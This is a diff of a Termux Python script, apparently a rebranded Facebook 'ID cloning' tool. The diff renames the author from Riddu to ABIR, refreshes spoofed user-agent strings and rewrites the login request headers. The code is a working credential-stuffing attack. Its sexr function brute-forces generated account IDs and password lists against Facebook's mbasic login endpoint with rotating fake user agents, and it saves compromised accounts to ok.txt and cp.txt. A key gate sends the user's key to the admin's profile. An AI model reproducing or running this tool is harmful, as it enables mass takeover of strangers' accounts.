@@ -1,4 +1,4 @@
-#Create By: Riddu ABIR
+#Create By: ABIR ABIR
 #Facebook: 𝑹𝑶𝑫𝑵𝑬𝒀  𝑪𝒀𝑷𝑹𝑰𝑨𝑵
 #GitHub: https://github.com/Hridoy0777
 #---------------------------------------------------------------------------#
@@ -57,7 +57,7 @@ ugen2=[]
 ugen3=[]
 ugen4=[]
 ugen=[]
-riddu=[]
+ABIR=[]
 ABIR=[]
 cokbrut=[]
 ses=requests.Session()
@@ -69,13 +69,13 @@ def back():
 	login()
 
 ah="-ABIR-"
-imt="=RIDDU="
+imt="=ABIR="
 ak="_BR1S7Y_"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.RIDDU -cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.ABIR -cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.RIDDU -cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.ABIR -cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 
@@ -90,22 +90,23 @@ prox=open('.prox.txt','r').read().splitlines()
 #sadiya','jannat','sumaiya','@@@###','i love you'
         
 for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 10; itel L6006 Build/QP1A.190711.020; wv)'
+        aa='Mozilla/5.0 (Linux; Android 10; moto g(8) play Build/QMDS30.47-34-5; wv)'
         b=random.choice(['6','7','8','9','10','11','12'])
-        c='Android 10; itel L6006 Build/'
+        c='Android 10; moto g(8) play Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
         f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45'
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.155'
         h=random.randrange(73,100)
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36[FBAN/EMA;FBLC/bn_IN;FBAV/322.0.0.6.110;]'
+        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]'
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
         
-      
+        
+
 
 ugen2=['Dalvik/2.1.0 (Linux; U; Android 10; Motorola Moto G Stylus 5G Build/QQ1B.320391.017) [FBAN/EMA;FBAV/328.0.0.94.93;FBBV/850911324;FBRV/0;FBPN/com.facebook.lite;FBLC/th_TH;FBMF/Motorola;FBBD/Motorola;FBDV/Motorola Moto G Stylus 5G;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
 
@@ -157,14 +158,14 @@ class Bristy:
         print(f"\033[1;32m [02] Random Email Clone ")
         print(f"\033[1;32m [00] Exit")
         print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
-        Riddu =input(" [?] Choose : ")
+        ABIR =input(" [?] Choose : ")
         os.system('xdg-open https://www.facebook.com/profile.php?id=100091474683129')
         os.system('espeak -a 250 "FOLLOW MY FACEBOOK ACCOUNT FOR NEXT UPDATES"')
-        if Riddu in ["1", "01"]:
+        if ABIR in ["1", "01"]:
             num()
-        if Riddu in ["2","02"]:
+        if ABIR in ["2","02"]:
             gml()
-        if Riddu in [" 0", "00"]:
+        if ABIR in [" 0", "00"]:
             exit()
         else:
             exit() 
@@ -212,7 +213,7 @@ def num():
     print(' [🍁] Ids saved in ok.txt,cp.txt')
     os.system('espeak -a 300 "YOUR CRACK HAS BEEN Completed"')
     os.system('espeak -a 200 "PLACE SAND REVIEW ADMIN"')
-    os.system('xdg-open https://www.facebook.com/Riddu999')
+    os.system('xdg-open  https://www.facebook.com/profile.php?id=100091474683129')
 
 def gml():
     user=[]
@@ -260,7 +261,7 @@ def gml():
     print(' [🍁] Ids saved in ok.txt,cp.txt')
     os.system('espeak -a 300 "YOUR CRACK HAS BEEN Completed"')
     os.system('espeak -a 200 "PLACE SAND REVIEW ADMIN"')
-    os.system('xdg-open https://www.facebook.com/Riddu999')
+    os.system('xdg-open  https://www.facebook.com/profile.php?id=100091474683129')
     
 
 def sexr(uid,pwx,tl):
@@ -272,7 +273,7 @@ def sexr(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mRIDDU\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
+            sys.stdout.write('\r[\033[1;92mABIR\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -285,7 +286,7 @@ def sexr(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb =  {'authority': 'mbasic.facebook.com',
+            header_freefb =  { 'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'authority': 'developer.facebook.com',
@@ -299,23 +300,22 @@ def sexr(uid,pwx,tl):
             'x-fb-trace-id': 'DKv719n6x5A',
             'x-fb-rev': '1007660106',
             'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	        'accept-language': 'en-US,en;q=0.9',
+    	    'cache-control': 'max-age=0',
+  		  'sec-ch-prefers-color-scheme': 'light',
+		    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+	        'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+     	   'sec-ch-ua-mobile': '?1',
+   		 'sec-ch-ua-platform': '"Android"',
+		    'sec-ch-ua-platform-version': '"10.0.0"',
+     	   'sec-fetch-dest': 'document',
+	 	   'sec-fetch-mode': 'navigate',
+	        'sec-fetch-site': 'none',
+	        'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+		    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
+}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
@@ -349,7 +349,7 @@ def sexr(uid,pwx,tl):
         
         
 def Valobasa():
-	key1=open('/data/data/com.termux/files/usr/bin/.RIDDU -cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.ABIR -cov', 'r').read()
 	clear()
 	print(logo)
 	r1=requests.get("https://github.com/Abir404cyber/Abir-404-cyber/blob/main/Aprove.txt").text
@@ -375,10 +375,10 @@ def Valobasa():
 		print (" Your Key : "+ak+ah+key1 )
 		print ("")
 		name = input(" Your Name : ")
-		print ("")
+		print ("your gf number")
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://www.facebook.com/Riddu999?text=' + tks)
+		os.system('am start https://www.facebook.com/profile.php?id=100091474683129?text=' + tks)
 		Valobasa()        
 Valobasa()
